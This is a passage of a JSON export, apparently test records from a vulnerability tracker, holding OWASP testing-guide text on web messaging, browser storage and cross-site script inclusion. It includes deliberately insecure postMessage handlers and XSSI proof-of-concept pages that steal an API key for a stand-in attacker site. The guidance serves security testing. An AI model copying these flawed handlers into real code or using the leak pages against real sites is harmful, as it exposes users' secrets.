(CSWSH)](http://www.christian-schneider.net/CrossSiteWebSocketHijacking.html)\n* [Robert Koch- On WebSockets in Penetration Testing](http://www.ub.tuwien.ac.at/dipl/2013/AC07815487.pdf)\n* [DigiNinja - ZAP and Web Sockets](http://www.digininja.org/blog/zap_web_sockets.php)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-11 Testing Web Messaging","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":"2024-06-27T15:59:29.3031362+00:00","Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Web Messaging (also known as [Cross Document Messaging](https://html.spec.whatwg.org/multipage/web-messaging.html#web-messaging)) allows applications running on different domains to communicate in a secure manner. Before the introduction of web messaging, the communication of different origins (between iframes, tabs and windows) was restricted by the same origin policy and enforced by the browser. Developers used multiple hacks in order to accomplish these tasks, and most of them were mainly insecure.\nThis restriction within the browser is in place to prevent a malicious website from reading confidential data from other iframes, tabs, etc; however, there are some legitimate cases where two trusted websites need to exchange data with each other. To meet this need, Cross Document Messaging was introduced in the [WHATWG HTML5](https://html.spec.whatwg.org/multipage/) draft specification and was implemented in all major browsers. It enables secure communications between multiple origins across iframes, tabs and windows.\nThe messaging API introduced the [\u0060postMessage()\u0060 method](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), with which plain-text messages can be sent cross-origin. It consists of two parameters: message, and domain.\nThere are some security concerns when using \u0060*\u0060 as the domain that we discuss below. In order to receive messages, the receiving website needs to add a new event handler, which has the following attributes:\n\n* Data, the content of the incoming message;\n* Origin of the sender document; and\n* Source, the source window.\n\nHere is an example of the messaging API in use. To send a message:\n\n\u0060\u0060\u0060\niframe1.contentWindow.postMessage(\u0022Hello world\u0022,\u0022http://www.example.com\u0022);\n\u0060\u0060\u0060\n\nTo receive a message:\n\n\u0060\u0060\u0060\nwindow.addEventListener(\u0022message\u0022, handler, true);\nfunction handler(event) {\n    if(event.origin === \u0027chat.example.com\u0027) {\n        /* process message (event.data) */\n    } else {\n        /* ignore messages from untrusted domains */\n    }\n}\n\u0060\u0060\u0060\n\n### Origin Security\n\nThe origin is made up of a scheme, host name, and port. It uniquely identifies the domain sending or receiving the message, and does not include the path or the fragment part of the URL. For instance, \u0060https://example.com\u0060 will be considered different from \u0060http://example.com\u0060 because the schema of the former is \u0060https\u0060, while the latter is \u0060http\u0060. This also applies to web servers running in the same domain but on different ports.","TestingInstructions":"## Test Objectives\n\n* Assess the security of the message\u2019s origin.\n* Validate that it\u2019s using safe methods and validating its input.\n\n## How to Test\n\n### Examine Origin Security\n\nTesters should check whether the application code is filtering and processing messages from trusted domains. Within the sending domain, also ensure that the receiving domain is explicitly stated, and that \u0060*\u0060 is not used as the second argument of \u0060postMessage()\u0060. This practice could introduce security concerns and could lead to, in the case of a redirection or if the origin changes by other means, the website sending data to unknown hosts, and therefore, leaking confidential data to malicious servers.\nIf the website fails to add security controls to restrict the domains or origins that are allowed to send messages to a website, it is likely to introduce a security risk. Testers should examine the code for message event listeners and get the callback function from the \u0060addEventListener\u0060 method for further analysis. Domains must always be verified prior to data manipulation.\n\n### Examine Input Validation\n\nAlthough the website is theoretically accepting messages from trusted domains only, data must still be treated as externally-sourced, untrusted data, and processed with the appropriate security controls. Testers should analyze the code and look for insecure methods, in particular where data is being evaluated via \u0060eval()\u0060 or inserted into the DOM via the \u0060innerHTML\u0060 property, which may create DOM-based XSS vulnerabilities.\n\n### Static Code Analysis\n\nJavaScript code should be analyzed to determine how web messaging is implemented. In particular, testers should be interested in how the website is restricting messages from untrusted domains, and how the data is handled even for trusted domains.\nIn this example, access is needed for every subdomain (www, chat, forums, \u2026) within the owasp.org domain. The code is trying to accept any domain with \u0060.owasp.org\u0060:\n\n\u0060\u0060\u0060\nwindow.addEventListener(\u0022message\u0022, callback, true);\n\nfunction callback(e) {\n    if(e.origin.indexOf(\u0022.owasp.org\u0022)!=-1) {\n        /* process message (e.data) */\n    }\n}\n\u0060\u0060\u0060\n\nThe intention is to allow subdomains such as:\n\n* \u0060www.owasp.org\u0060\n* \u0060chat.owasp.org\u0060\n* \u0060forums.owasp.org\u0060\n\nUnfortunately, this introduces vulnerabilities. An attacker can easily bypass the filter since a domain such as \u0060www.owasp.org.attacker.com\u0060 will match.\nHere is an example of code that lacks an origin check. This is very insecure, as it will accept input from any domain:\n\n\u0060\u0060\u0060\nwindow.addEventListener(\u0022message\u0022, callback, true);\n\nfunction callback(e) {\n        /* process message (e.data) */\n}\n\u0060\u0060\u0060\n\nHere is an example with input validation vulnerabilities that may lead to XSS attack:\n\n\u0060\u0060\u0060\nwindow.addEventListener(\u0022message\u0022, callback, true);\n\nfunction callback(e) {\n        if(e.origin === \u0022trusted.domain.com\u0022) {\n            element.innerHTML= e.data;\n        }\n}\n\u0060\u0060\u0060\n\nA more secure approach would be to use the property \u0060innerText\u0060 instead of \u0060innerHTML\u0060.\nFor further OWASP resources regarding web messaging, see [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-11 Testing Web Messaging","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Web Messaging (also known as [Cross Document Messaging](https://html.spec.whatwg.org/multipage/web-messaging.html#web-messaging)) allows applications running on different domains to communicate in a secure manner. Before the introduction of web messaging, the communication of different origins (between iframes, tabs and windows) was restricted by the same origin policy and enforced by the browser. Developers used multiple hacks in order to accomplish these tasks, and most of them were mainly insecure.\nThis restriction within the browser is in place to prevent a malicious website from reading confidential data from other iframes, tabs, etc; however, there are some legitimate cases where two trusted websites need to exchange data with each other. To meet this need, Cross Document Messaging was introduced in the [WHATWG HTML5](https://html.spec.whatwg.org/multipage/) draft specification and was implemented in all major browsers. It enables secure communications between multiple origins across iframes, tabs and windows.\nThe messaging API introduced the [\u0060postMessage()\u0060 method](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), with which plain-text messages can be sent cross-origin. It consists of two parameters: message, and domain.\nThere are some security concerns when using \u0060*\u0060 as the domain that we discuss below. In order to receive messages, the receiving website needs to add a new event handler, which has the following attributes:\n\n* Data, the content of the incoming message;\n* Origin of the sender document; and\n* Source, the source window.\n\nHere is an example of the messaging API in use. To send a message:\n\n\u0060\u0060\u0060\niframe1.contentWindow.postMessage(\u0022Hello world\u0022,\u0022http://www.example.com\u0022);\n\u0060\u0060\u0060\n\nTo receive a message:\n\n\u0060\u0060\u0060\nwindow.addEventListener(\u0022message\u0022, handler, true);\nfunction handler(event) {\n    if(event.origin === \u0027chat.example.com\u0027) {\n        /* process message (event.data) */\n    } else {\n        /* ignore messages from untrusted domains */\n    }\n}\n\u0060\u0060\u0060\n\n### Origin Security\n\nThe origin is made up of a scheme, host name, and port. It uniquely identifies the domain sending or receiving the message, and does not include the path or the fragment part of the URL. For instance, \u0060https://example.com\u0060 will be considered different from \u0060http://example.com\u0060 because the schema of the former is \u0060https\u0060, while the latter is \u0060http\u0060. This also applies to web servers running in the same domain but on different ports.","TestingInstructions":"## Test Objectives\n\n* Assess the security of the message\u2019s origin.\n* Validate that it\u2019s using safe methods and validating its input.\n\n## How to Test\n\n### Examine Origin Security\n\nTesters should check whether the application code is filtering and processing messages from trusted domains. Within the sending domain, also ensure that the receiving domain is explicitly stated, and that \u0060*\u0060 is not used as the second argument of \u0060postMessage()\u0060. This practice could introduce security concerns and could lead to, in the case of a redirection or if the origin changes by other means, the website sending data to unknown hosts, and therefore, leaking confidential data to malicious servers.\nIf the website fails to add security controls to restrict the domains or origins that are allowed to send messages to a website, it is likely to introduce a security risk. Testers should examine the code for message event listeners and get the callback function from the \u0060addEventListener\u0060 method for further analysis. Domains must always be verified prior to data manipulation.\n\n### Examine Input Validation\n\nAlthough the website is theoretically accepting messages from trusted domains only, data must still be treated as externally-sourced, untrusted data, and processed with the appropriate security controls. Testers should analyze the code and look for insecure methods, in particular where data is being evaluated via \u0060eval()\u0060 or inserted into the DOM via the \u0060innerHTML\u0060 property, which may create DOM-based XSS vulnerabilities.\n\n### Static Code Analysis\n\nJavaScript code should be analyzed to determine how web messaging is implemented. In particular, testers should be interested in how the website is restricting messages from untrusted domains, and how the data is handled even for trusted domains.\nIn this example, access is needed for every subdomain (www, chat, forums, \u2026) within the owasp.org domain. The code is trying to accept any domain with \u0060.owasp.org\u0060:\n\n\u0060\u0060\u0060\nwindow.addEventListener(\u0022message\u0022, callback, true);\n\nfunction callback(e) {\n    if(e.origin.indexOf(\u0022.owasp.org\u0022)!=-1) {\n        /* process message (e.data) */\n    }\n}\n\u0060\u0060\u0060\n\nThe intention is to allow subdomains such as:\n\n* \u0060www.owasp.org\u0060\n* \u0060chat.owasp.org\u0060\n* \u0060forums.owasp.org\u0060\n\nUnfortunately, this introduces vulnerabilities. An attacker can easily bypass the filter since a domain such as \u0060www.owasp.org.attacker.com\u0060 will match.\nHere is an example of code that lacks an origin check. This is very insecure, as it will accept input from any domain:\n\n\u0060\u0060\u0060\nwindow.addEventListener(\u0022message\u0022, callback, true);\n\nfunction callback(e) {\n        /* process message (e.data) */\n}\n\u0060\u0060\u0060\n\nHere is an example with input validation vulnerabilities that may lead to XSS attack:\n\n\u0060\u0060\u0060\nwindow.addEventListener(\u0022message\u0022, callback, true);\n\nfunction callback(e) {\n        if(e.origin === \u0022trusted.domain.com\u0022) {\n            element.innerHTML= e.data;\n        }\n}\n\u0060\u0060\u0060\n\nA more secure approach would be to use the property \u0060innerText\u0060 instead of \u0060innerHTML\u0060.\nFor further OWASP resources regarding web messaging, see [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-12 Testing Browser Storage","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Browsers provide the following client-side storage mechanisms for developers to store and retrieve data:\n\n* Local Storage\n* Session Storage\n* IndexedDB\n* Web SQL (Deprecated)\n* Cookies\n\nThese storage mechanisms can be viewed and edited using the browser\u2019s developer tools, such as [Google Chrome DevTools](https://developers.google.com/web/tools/chrome-devtools/storage/localstorage) or [Firefox\u2019s Storage Inspector](https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector).\nNote: While cache is also a form of storage it is covered in a [separate section](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses) covering its own peculiarities and concerns.","TestingInstructions":"## Test Objectives\n\n* Determine whether the website is storing sensitive data in client-side storage.\n* The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.\n\n## How to Test\n\n### Local Storage\n\n\u0060window.localStorage\u0060 is a global property that implements the [Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) and provides **persistent** key-value storage in the browser.\nBoth the keys and values can only be strings, so any non-string values must be converted to strings first before storing them, usually done via [JSON.stringify](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify).\nEntries to \u0060localStorage\u0060 persist even when the browser window closes, with the exception of windows in Private/Incognito mode.\nThe maximum storage capacity of \u0060localStorage\u0060 varies between browsers.\n\n#### List All Key-Value Entries\n\n\u0060\u0060\u0060\nfor (let i = 0; i \u003C localStorage.length; i\u002B\u002B) {\n  const key = localStorage.key(i);\n  const value = localStorage.getItem(key);\n  console.log(\u0060${key}: ${value}\u0060);\n}\n\u0060\u0060\u0060\n\n### Session Storage\n\n\u0060window.sessionStorage\u0060 is a global property that implements the [Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) and provides **ephemeral** key-value storage in the browser.\nBoth the keys and values can only be strings, so any non-string values must be converted to strings first before storing them, usually done via [JSON.stringify](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify).\nEntries to \u0060sessionStorage\u0060 are ephemeral because they are cleared when the browser tab/window is closed.\nThe maximum storage capacity of \u0060sessionStorage\u0060 varies between browsers.\n\n#### List All Key-Value Entries\n\n\u0060\u0060\u0060\nfor (let i = 0; i \u003C sessionStorage.length; i\u002B\u002B) {\n  const key = sessionStorage.key(i);\n  const value = sessionStorage.getItem(key);\n  console.log(\u0060${key}: ${value}\u0060);\n}\n\u0060\u0060\u0060\n\n### IndexedDB\n\nIndexedDB is a transactional, object-oriented database intended for structured data. An IndexedDB database can have multiple object stores and each object store can have multiple objects.\nIn contrast to Local Storage and Session Storage, IndexedDB can store more than just strings. Any objects supported by the [structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm) can be stored in IndexedDB.\nAn example of a complex JavaScript object that can be stored in IndexedDB, but not in Local/Session Storage are [CryptoKeys](https://developer.mozilla.org/en-US/docs/Web/API/CryptoKey).\nW3C recommendation on [Web Crypto API](https://www.w3.org/TR/WebCryptoAPI/) [recommends](https://www.w3.org/TR/WebCryptoAPI/#concepts-key-storage) that CryptoKeys that need to be persisted in the browser, to be stored in IndexedDB. When testing a web page, look for any CryptoKeys in IndexedDB and check if they are set as \u0060extractable: true\u0060 when they should have been set to \u0060extractable: false\u0060 (i.e. ensure the underlying private key material is never exposed during cryptographic operations.)\n\n#### Print All the Contents of IndexedDB\n\n\u0060\u0060\u0060\nconst dumpIndexedDB = dbName =\u003E {\n  const DB_VERSION = 1;\n  const req = indexedDB.open(dbName, DB_VERSION);\n  req.onsuccess = function() {\n    const db = req.result;\n    const objectStoreNames = db.objectStoreNames || [];\n\n    console.log(\u0060[*] Database: ${dbName}\u0060);\n\n    Array.from(objectStoreNames).forEach(storeName =\u003E {\n      const txn = db.transaction(storeName, \u0027readonly\u0027);\n      const objectStore = txn.objectStore(storeName);\n\n      console.log(\u0060\\t[\u002B] ObjectStore: ${storeName}\u0060);\n\n      // Print all entries in objectStore with name \u0060storeName\u0060\n      objectStore.getAll().onsuccess = event =\u003E {\n        const items = event.target.result || [];\n        items.forEach(item =\u003E console.log(\u0060\\t\\t[-] \u0060, item));\n      };\n    });\n  };\n};\n\nindexedDB.databases().then(dbs =\u003E dbs.forEach(db =\u003E dumpIndexedDB(db.name)));\n\u0060\u0060\u0060\n\n### Web SQL\n\nWeb SQL is deprecated since November 18, 2010 and it\u2019s recommended that web developers do not use it.\n\n### Cookies\n\nCookies are a key-value storage mechanism that is primarily used for session management but web developers can still use it to store arbitrary string data.\nCookies are covered extensively in the [testing for Cookies attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes) scenario.\n\n#### List All Cookies\n\n\u0060\u0060\u0060\nconsole.log(window.document.cookie);\n\u0060\u0060\u0060\n\n### Global Window Object\n\nSometimes web developers initialize and maintain global state that is available only during the runtime life of the page by assigning custom attributes to the global \u0060window\u0060 object. For example:\n\n\u0060\u0060\u0060\nwindow.MY_STATE = {\n  counter: 0,\n  flag: false,\n};\n\u0060\u0060\u0060\n\nAny data attached on the \u0060window\u0060 object will be lost when the page is refreshed or closed.\n\n#### List All Entries on the Window Object\n\n\u0060\u0060\u0060\n(() =\u003E {\n  // create an iframe and append to body to load a clean window object\n  const iframe = document.createElement(\u0027iframe\u0027);\n  iframe.style.display = \u0027none\u0027;\n  document.body.appendChild(iframe);\n\n  // get the current list of properties on window\n  const currentWindow = Object.getOwnPropertyNames(window);\n\n  // filter the list against the properties that exist in the clean window\n  const results = currentWindow.filter(\n    prop =\u003E !iframe.contentWindow.hasOwnProperty(prop)\n  );\n\n  // remove iframe\n  document.body.removeChild(iframe);\n\n  // log key-value entries that are different\n  results.forEach(key =\u003E console.log(\u0060${key}: ${window[key]}\u0060));\n})();\n\u0060\u0060\u0060\n\n*(Modified version of this [snippet](https://stackoverflow.com/a/17246535/3099132))*\n\n### Attack Chain\n\nFollowing the identification any of the above attack vectors, an attack chain can be formed with different types of client-side attacks, such as [DOM based XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting) attacks.\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":"Applications should be storing sensitive data on the server-side, and not on the client-side, in a secured manner following best practices.","References":"* [Local Storage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)\n* [Session Storage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)\n* [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)\n* [Web Crypto API: Key Storage](https://www.w3.org/TR/WebCryptoAPI/#concepts-key-storage)\n* [Web SQL](https://www.w3.org/TR/webdatabase/)\n* [Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)\n\nFor more OWASP resources on the HTML5 Web Storage API, see the [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#html5-web-storage-api).","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-13 Testing for Cross Site Script Inclusion","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Cross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries. Sensitive data could include authentication-related data (login states, cookies, auth tokens, session IDs, etc.) or user\u2019s personal or sensitive personal data (email addresses, phone numbers, credit card details, social security numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but has a different purpose. Where CSRF uses the authenticated user context to execute certain state-changing actions inside a victim\u2019s page (e.g. transfer money to the attacker\u2019s account, modify privileges, reset password, etc.), XSSI instead uses JavaScript on the client-side to leak sensitive data from authenticated sessions.\nBy default, websites are only allowed to access data if they are from the same origin. This is a key application security principle and governed by the same-origin policy (defined by [RFC 6454](https://tools.ietf.org/html/rfc6454)). An origin is defined as the combination of URI scheme (HTTP or HTTPS), host name, and port number. However, this policy is not applicable for HTML \u0060\u003Cscript\u003E\u0060 tag inclusions. This exception is necessary, as without it websites would not be able to consume third party services, perform traffic analysis, or use advertisement platforms, etc.\nWhen the browser opens a website with \u0060\u003Cscript\u003E\u0060 tags, the resources are fetched from the cross-origin domain. The resources then run in the same context as the including site or browser, which presents the opportunity to leak sensitive data. In most cases, this is achieved using JavaScript, however, the script source doesn\u2019t have to be a JavaScript file with type \u0060text/javascript\u0060 or \u0060.js\u0060 extension.\nOlder browser\u2019s vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those vulnerabilities have now been patched by vendors and are considered less relevant. By setting the charset attribute of the \u0060\u003Cscript\u003E\u0060 tag, an attacker or tester can enforce UTF-16 encoding, allowing data leakage for other data formats (e.g. JSON) in some cases. For more on these attacks, see [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf).","TestingInstructions":"## Test Objectives\n\n* Locate sensitive data across the system.\n* Assess the leakage of sensitive data through various techniques.\n\n## How to Test\n\n### Collect Data Using Authenticated and Unauthenticated User Sessions\n\nIdentify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using [JSONP](https://en.wikipedia.org/wiki/JSONP). To find dynamically generated JavaScript responses, generate authenticated and unauthenticated requests, then compare them. If they\u2019re different, it means the response is dynamic; otherwise it\u2019s static. To simplify this task, a tool such as [Veit Hailperin\u2019s Burp proxy plugin](https://github.com/luh2/DetectDynamicJS) can be used. Make sure to check other file types in addition to JavaScript; XSSI is not limited to JavaScript files alone.\n\n### Determine Whether the Sensitive Data Can Be Leaked Using JavaScript\n\nTesters should analyze code for the following vehicles for data leakage via XSSI vulnerabilities:\n\n1. Global variables\n2. Global function parameters\n3. CSV (Comma Separated Values) with quotations theft\n4. JavaScript runtime errors\n5. Prototype chaining using \u0060this\u0060\n\n### 1\\. Sensitive Data Leakage via Global Variables\n\nAn API key is stored in a JavaScript file with the URI \u0060https://victim.com/internal/api.js\u0060 on the victim\u2019s website, \u0060victim.com\u0060, which is only accessible to authenticated users. An attacker configures a website, \u0060attackingwebsite.com\u0060, and uses the \u0060\u003Cscript\u003E\u0060 tag to refer to the JavaScript file.\nHere are the contents of \u0060https://victim.com/internal/api.js\u0060:\n\n\u0060\u0060\u0060\n(function() {\n  window.secret = \u0022supersecretUserAPIkey\u0022;\n})();\n\u0060\u0060\u0060\n\nThe attack site, \u0060attackingwebsite.com\u0060, has an \u0060index.html\u0060 with the following code:\n\n\u0060\u0060\u0060\n\u003C!DOCTYPE html\u003E\n\u003Chtml\u003E\n  \u003Chead\u003E\n    \u003Ctitle\u003ELeaking data via global variables\u003C/title\u003E\n  \u003C/head\u003E\n  \u003Cbody\u003E\n    \u003Ch1\u003ELeaking data via global variables\u003C/h1\u003E\n    \u003Cscript src=\u0022https://victim.com/internal/api.js\u0022\u003E\u003C/script\u003E\n    \u003Cdiv id=\u0022result\u0022\u003E\n    \u003C/div\u003E\n    \u003Cscript\u003E\n      var div = document.getElementById(\u0022result\u0022);\n      div.innerHTML = \u0022Your secret data \u003Cb\u003E\u0022 \u002B window.secret \u002B \u0022\u003C/b\u003E\u0022;\n    \u003C/script\u003E\n  \u003C/body\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\nIn this example, a victim is authenticated with \u0060victim.com\u0060. An attacker lures the victim to \u0060attackingwebsite.com\u0060 via social engineering, phishing emails, etc. The victim\u2019s browser then fetches \u0060api.js\u0060, resulting in the sensitive data being leaked via the global JavaScript variable and displayed using \u0060innerHTML\u0060.\n\n### 2\\. Sensitive Data Leakage via Global Function Parameters\n\nThis example is similar to the previous one, except in this case \u0060attackingwebsite.com\u0060 uses a global JavaScript function to extract the sensitive data by overwriting the victim\u2019s global JavaScript function.\nHere are the contents of \u0060https://victim.com/internal/api.js\u0060:\n\n\u0060\u0060\u0060\n(function() {\n  var secret = \u0022supersecretAPIkey\u0022;\n  window.globalFunction(secret);\n})();\n\u0060\u0060\u0060\n\nThe attack site, \u0060attackingwebsite.com\u0060, has an \u0060index.html\u0060 with the following code:\n\n\u0060\u0060\u0060\n\u003C!DOCTYPE html\u003E\n\u003Chtml\u003E\n  \u003Chead\u003E\n    \u003Ctitle\u003ELeaking data via global function parameters\u003C/title\u003E\n  \u003C/head\u003E\n  \u003Cbody\u003E\n    \u003Cdiv id=\u0022result\u0022\u003E\n    \u003C/div\u003E\n    \u003Cscript\u003E\n      function globalFunction(param) {\n        var div = document.getElementById(\u0022result\u0022);\n        div.innerHTML = \u0022Your secret data: \u003Cb\u003E\u0022 \u002B param \u002B \u0022\u003C/b\u003E\u0022;\n      }\n    \u003C/script\u003E\n    \u003Cscript src=\u0022https://victim.com/internal/api.js\u0022\u003E\u003C/script\u003E\n  \u003C/body\u003E\n\u003C/html\u003E\n\u0060\u0060\u0060\n\nThere are other XSSI vulnerabilities that can result in sensitive data leakage either via JavaScript prototype chains or global function calls. For more on these attacks, see [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).\n\n### 3\\. Sensitive Data Leakage via CSV with Quotations Theft\n\nTo leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example code is an excerpt from Takeshi Terada\u2019s [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf) whitepaper.\n\n\u0060\u0060\u0060\nHTTP/1.1 200 OK\nContent-Type: text/csv\nContent-Disposition: attachment; filename=\u0022a.csv\u0022\nContent-Length: xxxx\n\n1,\u0022___\u0022,\u0022aaa@a.example\u0022,\u002203-0000-0001\u0022\n2,\u0022foo\u0022,\u0022bbb@b.example\u0022,\u002203-0000-0002\u0022\n...\n98,\u0022bar\u0022,\u0022yyy@example.net\u0022,\u002203-0000-0088\u0022\n99,\u0022___\u0022,\u0022zzz@example.com\u0022,\u002203-0000-0099\u0022\n\u0060\u0060\u0060\n\nIn this example, using the \u0060___\u0060 columns as injection points and inserting JavaScript strings in their place has the following 